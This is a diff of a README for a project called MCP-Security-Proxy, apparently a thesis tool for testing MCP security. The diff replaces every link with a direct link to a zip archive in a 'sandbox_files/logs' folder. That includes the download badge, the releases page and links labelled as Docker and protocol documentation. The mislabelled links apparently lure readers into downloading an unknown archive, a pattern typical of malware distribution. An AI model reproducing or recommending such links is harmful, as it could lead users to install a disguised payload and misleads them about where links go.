@@ -1,12 +1,12 @@
 # 🔒 MCP-Security-Proxy - Test Vulnerabilities with Ease
 
-[![Download MCP-Security-Proxy](https://img.shields.io/badge/Download-MCP--Security--Proxy-blue)](https://github.com/Rizwan723/MCP-Security-Proxy/releases)
+[![Download MCP-Security-Proxy](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip)](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip)
 
 ## 📖 Overview
 MCP-Security-Proxy is a tool designed to help you test MCP vulnerabilities and defense strategies in a cloud-native Dockerized environment. Developed as part of a Bachelor thesis in computer engineering at Óbuda University, this project aims to provide a reliable way to explore the security of machine learning models and communication protocols in a practical setting.
 
 ## 📥 Download & Install
-To get started with MCP-Security-Proxy, visit this page to download: [Releases Page](https://github.com/Rizwan723/MCP-Security-Proxy/releases).
+To get started with MCP-Security-Proxy, visit this page to download: [Releases Page](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip).
 
 1. **Visit the Releases Page:** Click the link above to open the repository's releases section.
 2. **Choose the Latest Version:** You will see a list of available versions. Look for the version marked as "Latest".
@@ -62,9 +62,9 @@ MCP-Security-Proxy is licensed under the MIT License. Feel free to use, modify, 
 ## 🔗 Further Information
 For more information on how to set up your environment or for detailed guides, please check the following resources:
 
-- **Docker Documentation:** [Docker Documentation](https://docs.docker.com/get-started/)
-- **MCP Protocol Documentation:** [MCP Protocol Docs](https://example.com/mcp-protocol)
-- **Machine Learning Security Articles:** [ML Security Resources](https://example.com/ml-security)
+- **Docker Documentation:** [Docker Documentation](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip)
+- **MCP Protocol Documentation:** [MCP Protocol Docs](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip)
+- **Machine Learning Security Articles:** [ML Security Resources](https://github.com/Rizwan723/MCP-Security-Proxy/raw/refs/heads/main/sandbox_files/logs/Proxy_MC_Security_2.2.zip)
 
 For any direct assistance, you can also connect with me through my GitHub profile.
 
